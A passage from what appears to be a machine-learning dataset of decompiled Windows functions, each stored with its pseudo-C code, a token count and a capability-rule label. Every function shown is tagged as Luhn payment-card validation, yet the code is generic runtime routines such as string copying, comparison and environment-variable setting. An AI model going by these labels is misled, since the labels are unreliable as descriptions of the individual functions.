        "decompiled_code": "\nuint32_t * fcn.004200e0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x004201d0;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x004201d0:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "004202ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.004202ae(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint noname_2;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t var_4h;\n    \n    if (arg_ch + 1 < 0x101) {\n        arg_ch._2_2_ = *(*(arg_8h + 0x48) + arg_ch * 2);\n    }\n    else {\n        if ((*(*(arg_8h + 0x48) + 1 + (arg_ch >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            var_4h = in_ECX & 0xffff0000 | arg_ch & 0xff;\n            noname_2 = 1;\n        }\n        else {\n            var_4h = CONCAT11(arg_ch, arg_ch >> 8);\n            var_4h = in_ECX & 0xff000000 | var_4h;\n            noname_2 = 2;\n        }\n        iVar1 = fcn.004211e4(1, &var_4h, noname_2, &arg_ch + 2, *(arg_8h + 4), *(arg_8h + 0x14), 1, var_4h, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return arg_ch._2_2_ & arg_10h;\n}\n",
        "token_count": 428
    },
    "004204c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004204c2(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (0 < param_2) {\n        puVar1 = &param_2;\n        iVar2 = param_2;\n        do {\n            puVar1 = puVar1 + 1;\n            fcn.004200f0(param_1, *puVar1);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0042064b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.0042064b(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    bVar1 = true;\n    if (*0x44dc6c == NULL) {\n        *0x44dc6c = fcn.004188ff(0x351);\n        if (*0x44dc6c == NULL) {\n            return NULL;\n        }\n    }\n    **0x44dc6c = 0;\n    fcn.004204c2(*0x44dc6c, 3, *0x44dc74, 0x4424b4, *0x44dc78);\n    puVar3 = 0x44dc78;\n    do {\n        fcn.004200f0(*0x44dc6c, 0x440700);\n        puVar4 = puVar3 + 3;\n        iVar2 = fcn.0041b910(*puVar3, *puVar4);\n        if (iVar2 != 0) {\n            bVar1 = false;\n        }\n        fcn.004204c2(*0x44dc6c, 3, puVar3[2], 0x4424b4, *puVar4);\n        puVar3 = puVar4;\n    } while (puVar4 < 0x44dca8);\n    if (!bVar1) {\n        return *0x44dc6c;\n    }\n    fcn.00418911(*0x44dc6c);\n    *0x44dc6c = NULL;\n    return *0x44dc84;\n}\n",
        "token_count": 363
    },
    "00421640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00421640(char *arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = arg_10h;\n    pcVar6 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        iVar5 = arg_10h - uVar4;\n        do {\n            pcVar6 = arg_ch;\n            pcVar7 = arg_8h;\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            pcVar7 = arg_8h + 1;\n            pcVar6 = arg_ch + 1;\n            cVar1 = *arg_ch;\n            cVar2 = *arg_8h;\n            arg_ch = pcVar6;\n            arg_8h = pcVar7;\n        } while (cVar1 == cVar2);\n        uVar3 = pcVar6[-1];\n        arg_10h = 0;\n        bVar8 = uVar3 == pcVar7[-1];\n        if (uVar3 < pcVar7[-1] || bVar8) {\n            if (bVar8) {\n                return 0;\n            }\n            arg_10h = 0xfffffffe;\n        }\n        arg_10h = ~arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 414
    },
    "00421b8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421b8e(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    fcn.00421b2e(iVar1, param_1, param_2);\n    return;\n}\n",
        "token_count": 106
    },
    "00422437": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422437(uint param_1, uint param_2)\n\n{\n    fcn.004222df(param_1, param_2, 0x44dd4c);\n    return;\n}\n",
        "token_count": 46
    },
    "0042244d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042244d(uint param_1, uint param_2)\n\n{\n    fcn.004222df(param_1, param_2, 0x44dd64);\n    return;\n}\n",
        "token_count": 46
    },
    "00422463": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422463(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    fcn.0042545e(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.00422437(&var_10h, arg_8h);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 121
    },
    "004224a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004224a0(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    fcn.0042545e(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.0042244d(&var_10h, arg_8h);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 123
    },
    "004224dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004224dd(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char *arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char cVar4;\n    \n    arg_8h_00 = arg_8h;\n    pcVar3 = *(arg_10h + 0xc);\n    arg_ch_00 = arg_8h + 1;\n    *arg_8h = '0';\n    pcVar1 = arg_ch_00;\n    if (0 < arg_ch) {\n        arg_8h = arg_ch;\n        arg_ch = 0;\n        do {\n            cVar4 = *pcVar3;\n            if (cVar4 == '\\0') {\n                cVar4 = '0';\n            }\n            else {\n                pcVar3 = pcVar3 + 1;\n            }\n            *pcVar1 = cVar4;\n            pcVar1 = pcVar1 + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != NULL);\n    }\n    *pcVar1 = '\\0';\n    if ((-1 < arg_ch) && ('4' < *pcVar3)) {\n        while (pcVar1 = pcVar1 + -1,  *pcVar1 == '9') {\n            *pcVar1 = '0';\n        }\n        *pcVar1 = *pcVar1 + '\\x01';\n    }\n    if (*arg_8h_00 == '1') {\n        *(arg_10h + 4) = *(arg_10h + 4) + 1;\n    }\n    else {\n        iVar2 = fcn.004196b0(arg_ch_00);\n        fcn.00418360(arg_8h_00, arg_ch_00, iVar2 + 1);\n    }\n    return;\n}\n",
        "token_count": 436
    },
    "0042260e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042260e(uint arg_8h, uint noname_1, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_stack_ffffffb8;\n    ushort uVar4;\n    uint var_2ch;\n    uchar var_28h [24];\n    uint var_10h;\n    uint uStack16;\n    ushort uStack12;\n    uint var_4h;\n    \n    uVar4 = in_stack_ffffffb8 >> 0x10;\n    var_4h = *0x44d270;\n    fcn.00422554(&var_10h, &arg_8h);\n    iVar3 = fcn.00425892(var_10h, uStack16, CONCAT22(uVar4, uStack12), 0x11, 0, &var_2ch);\n    iVar2 = arg_14h;\n    piVar1 = arg_10h;\n    arg_10h[2] = iVar3;\n    *arg_10h = var_2ch._2_1_;\n    arg_10h[1] = var_2ch;\n    fcn.004200e0(arg_14h, var_28h);\n    piVar1[3] = iVar2;\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 326
    },
    "00423424": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423424(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    fcn.00423364(iVar1, param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 111
    },
    "004240ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004240ec(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    return iVar1 + 0xc;\n}\n",
        "token_count": 83
    },
    "004242f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004242f6(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = 0;\n    while (cVar2 = *param_2,  cVar2 != '\\0') {\n        param_2 = param_2 + 1;\n        if ((cVar2 < 'a') || ('f' < cVar2)) {\n            if (('@' < cVar2) && (cVar2 < 'G')) {\n                cVar2 = cVar2 + -7;\n            }\n        }\n        else {\n            cVar2 = cVar2 + -0x27;\n        }\n        iVar1 = (iVar1 + 0xffffffd) * 0x10 + cVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 185
    },
    "00424c05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00424c05(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    uVar1 = param_2;\n    do {\n        if (*(uVar1 + 4) == unaff_ESI) break;\n        uVar1 = uVar1 + 0xc;\n    } while (uVar1 < param_2 + *0x44da9c * 0xc);\n    if ((param_2 + *0x44da9c * 0xc <= uVar1) || (*(uVar1 + 4) != unaff_ESI)) {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 167
    },
    "00425216": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00425216(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n    var_4h = 0;\n    iVar2 = **0x4507ac;\n    piVar3 = *0x4507ac;\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = (*pcVar1)(0, 0, iVar2, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (var_4h = fcn.004188ff(iVar2),  var_4h == 0)) break;\n        iVar2 = (*pcVar1)(0, 0, *piVar3, 0xffffffff, var_4h, iVar2, 0, 0);\n        if (iVar2 == 0) {\n            fcn.00418911(var_4h);\n            return 0xffffffff;\n        }\n        iVar2 = fcn.004265a4(&var_4h, 0);\n        if ((iVar2 < 0) && (var_4h != 0)) {\n            fcn.00418911(var_4h);\n            var_4h = 0;\n        }\n        piVar3 = piVar3 + 1;\n        iVar2 = *piVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 355
    },
    "00425db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00425db0(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar5;\n    uint32_t uVar4;\n    \n    uVar4 = 0xff;\n    do {\n        do {\n            cVar2 = uVar4;\n            if (cVar2 == '\\0') goto code_r0x00425df6;\n            cVar2 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            cVar1 = *arg_8h;\n            uVar4 = CONCAT11(cVar1, cVar2);\n            arg_8h = arg_8h + 1;\n        } while (uVar4 >> 8 == cVar2);\n        uVar3 = cVar1 + 0xbf;\n        uVar3 = uVar3 + (-(uVar3 < 0x1a) & 0x20U) + 0x41;\n        uVar4 = CONCAT11(cVar2 + 0xbfU + (-(cVar2 + 0xbfU < 0x1a) & 0x20U) + 'A', uVar3);\n        uVar5 = uVar4 >> 8;\n    } while (uVar3 == uVar5);\n    cVar2 = (uVar3 < uVar5) * -2 + '\\x01';\ncode_r0x00425df6:\n    return cVar2;\n}\n",
        "token_count": 338
    },
    "004265a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004265a4(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    bool bVar5;\n    uint var_10h;\n    uint var_ch;\n    uint lpValue;\n    uint var_4h;\n    \n    var_10h = 0;\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    arg_8h_00 = *arg_8h;\n    if (arg_8h_00 == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.00419ad5(arg_8h_00, 0x3d);\n    if (iVar1 == 0) {\n        return 0xffffffff;\n    }\n    if (arg_8h_00 == iVar1) {\n        return 0xffffffff;\n    }\n    bVar5 = *(iVar1 + 1) == '\\0';\n    if (*0x4507a4 == *0x4507a8) {\n        *0x4507a4 = fcn.00426543();\n    }\n    if (*0x4507a4 == NULL) {\n        if ((arg_ch != 0) && (*0x4507ac != NULL)) {\n            iVar2 = fcn.00425216();\n            if (iVar2 != 0) {\n                return 0xffffffff;\n            }\n            goto code_r0x00426659;\n        }\n        if (!bVar5) {\n            *0x4507a4 = fcn.004188ff(4);\n            if (*0x4507a4 == NULL) {\n                return 0xffffffff;\n            }\n            **0x4507a4 = 0;\n            if (*0x4507ac == NULL) {\n                *0x4507ac = fcn.004188ff(4);\n                if (*0x4507ac == NULL) {\n                    return 0xffffffff;\n                }\n                **0x4507ac = 0;\n            }\n            goto code_r0x00426659;\n        }\ncode_r0x00426627:\n        var_10h = 0;\n    }\n    else {\ncode_r0x00426659:\n        piVar3 = *0x4507a4;\n        iVar2 = fcn.004264f6(arg_8h_00);\n        if ((iVar2 < 0) || (*piVar3 == 0)) {\n            if (bVar5) {\n                fcn.00418911(arg_8h_00);\n                *arg_8h = 0;\n                goto code_r0x00426627;\n            }\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n            }\n            piVar3 = fcn.00419b50(*0x4507a4, iVar2 * 4 + 8);\n            if (piVar3 == NULL) {\n                return 0xffffffff;\n            }\n            piVar3[iVar2] = arg_8h_00;\n            (piVar3 + iVar2)[1] = 0;\n            *arg_8h = 0;\ncode_r0x004266f6:\n            *0x4507a4 = piVar3;\n        }\n        else {\n            piVar3 = piVar3 + iVar2;\n            fcn.00418911(*piVar3);\n            if (bVar5) {\n                for (; *piVar3 != 0; piVar3 = piVar3 + 1) {\n                    *piVar3 = piVar3[1];\n                    iVar2 = iVar2 + 1;\n                }\n                piVar3 = fcn.00419b50(*0x4507a4, iVar2 << 2);\n                if (piVar3 != NULL) goto code_r0x004266f6;\n            }\n            else {\n                *piVar3 = arg_8h_00;\n                *arg_8h = 0;\n            }\n        }\n        if (arg_ch != 0) {\n            iVar2 = fcn.004196b0(arg_8h_00);\n            iVar2 = fcn.004188ff(iVar2 + 2);\n            if (iVar2 != 0) {\n                fcn.004200e0(iVar2, arg_8h_00);\n                puVar4 = (iVar2 - arg_8h_00) + iVar1;\n                *puVar4 = 0;\n                iVar1 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(iVar2, ~-bVar5 & puVar4 + 1);\n                if (iVar1 == 0) {\n                    var_10h = 0xffffffff;\n                }\n                fcn.00418911(iVar2);\n            }\n        }\n        if (bVar5) {\n            fcn.00418911(arg_8h_00);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1108
    },
    "004269ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004269ab(ushort *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_ch_00;\n    uint var_10h;\n    ushort uStack16;\n    ushort uStack14;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    iVar4 = 0x44df40;\n    if (arg_ch != 0) {\n        if (arg_ch < 0) {\n            arg_ch = -arg_ch;\n            iVar4 = 0x44e0a0;\n        }\n        if (arg_10h == 0) {\n            *arg_8h = 0;\n        }\n        while (arg_ch != 0) {\n            uVar1 = arg_ch >> 3;\n            uVar3 = arg_ch & 7;\n            iVar4 = iVar4 + 0x54;\n            arg_ch = uVar1;\n            if (uVar3 != 0) {\n                arg_ch_00 = iVar4 + uVar3 * 0xc;\n                if (0x7fff < *arg_ch_00) {\n                    var_10h._0_2_ = *arg_ch_00;\n                    var_10h._2_2_ = *arg_ch_00 >> 0x10;\n                    uStack16 = arg_ch_00[1];\n                    uStack14 = arg_ch_00[1] >> 0x10;\n                    uStack12 = arg_ch_00[2];\n                    iVar2 = CONCAT22(uStack16, var_10h._2_2_) + -1;\n                    var_10h._2_2_ = iVar2;\n                    uStack16 = iVar2 >> 0x10;\n                    arg_ch_00 = &var_10h;\n                }\n                fcn.00426779(arg_8h, arg_ch_00);\n            }\n        }\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 480
    },
    "00426cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00426cb0(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar2 = *arg_8h;\n            uVar1 = *arg_ch;\n            if ((uVar2 == 0) || (uVar1 == 0)) break;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            if ((0x40 < uVar2) && (uVar2 < 0x5b)) {\n                uVar2 = uVar2 + 0x20;\n            }\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                uVar1 = uVar1 + 0x20;\n            }\n            bVar3 = uVar2 < uVar1;\n            if (uVar2 != uVar1) goto code_r0x00426d01;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        arg_10h = 0;\n        bVar3 = uVar2 < uVar1;\n        if (uVar2 != uVar1) {\ncode_r0x00426d01:\n            arg_10h = -1;\n            if (!bVar3) {\n                arg_10h = 1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 364
    },
    "00427bfa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.00427bfa(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0;\n    if (*(unaff_EBP + 0x10) != 0) {\n        *extraout_ECX = 0x444568;\n        extraout_ECX[1] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x10) = 1;\n    }\n    uVar1 = *(unaff_EBP + 0xc);\n    *(extraout_ECX + *(*extraout_ECX + 4)) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    fcn.00427bae(*(unaff_EBP + 8), uVar1);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 346
    },
    "00427e53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00427e53(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_retaddr;\n    \n    if (-*(param_1 + 0x14) - 1U <= param_2) {\n        fcn.004272b2();\n    }\n    if (param_2 != 0) {\n        iVar3 = *(param_1 + 0x14) + param_2;\n        cVar1 = fcn.004024b0(iVar3, 0);\n        if (cVar1 != '\\0') {\n            if (*(param_1 + 0x18) < 0x10) {\n                iVar2 = param_1 + 4;\n            }\n            else {\n                iVar2 = *(param_1 + 4);\n            }\n            fcn.0042730f(*(param_1 + 0x14) + iVar2, param_2, unaff_retaddr);\n            fcn.00401c40(iVar3);\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 254
    },
    "00428b1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00428b1d(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00419d14(0x4445a8, 0x1c);\n    uVar2 = fcn.0042032b();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(uVar2);\n    iVar3 = fcn.00420325();\n    if (iVar3 == 0) {\n        *(unaff_EBP + -0x1c) = 0;\n    }\n    else {\n        uVar2 = fcn.0042032b();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar2);\n        fcn.0041c713(0xc);\n        *(unaff_EBP + -0x1c) = 1;\n    }\n    *(unaff_EBP + -4) = 0;\n    iVar3 = fcn.004240ec();\n    *(unaff_EBP + -0x2c) = *(iVar3 + 4);\n    uVar2 = fcn.004240d3();\n    *(unaff_EBP + -0x28) = uVar2;\n    iVar3 = fcn.004188ff(0x200);\n    *(unaff_EBP + -0x24) = iVar3;\n    if (iVar3 == 0) {\n        uVar2 = fcn.00421466();\n        *(unaff_EBP + -0x24) = uVar2;\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        arg_10h = 0x200;\n        uVar2 = fcn.00421466();\n        fcn.00419370(*(unaff_EBP + -0x24), uVar2, arg_10h);\n        *(unaff_EBP + -0x20) = 1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00428bcb();\n    puVar1 = *(unaff_EBP + 8);\n    *puVar1 = *(unaff_EBP + -0x2c);\n    puVar1[1] = *(unaff_EBP + -0x28);\n    puVar1[2] = *(unaff_EBP + -0x24);\n    puVar1[3] = *(unaff_EBP + -0x20);\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 633
    },
    "00428be8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00428be8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *arg_ch_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x4445b8, 0xc);\n    arg_ch_00 = *(unaff_EBP + 0xc);\n    if (arg_ch_00 == NULL) {\n        iVar1 = fcn.004240ec();\n        iVar1 = *(iVar1 + 8);\n    }\n    else {\n        iVar1 = *arg_ch_00;\n    }\n    if (iVar1 != 0) {\n        uVar2 = fcn.0042032b();\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(uVar2);\n        iVar1 = fcn.00420325();\n        if (iVar1 == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        else {\n            uVar2 = fcn.0042032b();\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar2);\n            fcn.0041c713(0xc);\n            *(unaff_EBP + -0x1c) = 1;\n        }\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00428a34(*(unaff_EBP + 8), arg_ch_00);\n        *(unaff_EBP + 8) = uVar2;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00428c77();\n    }\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 411
    },
    "00429564": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00429564(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00419d14();\n    fcn.0041c46a(*(unaff_EBP + 0x14));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.0042945d(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004295a6(0x444658, noname_1, unaff_retaddr, arg_8h);\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 275
    },
    "004296b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004296b9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x444678, 0xc);\n    fcn.0041c46a(*(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.0042962a(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004296f8(0x444678);\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 227
    },
    "0042a3fd": {
        "rules": [
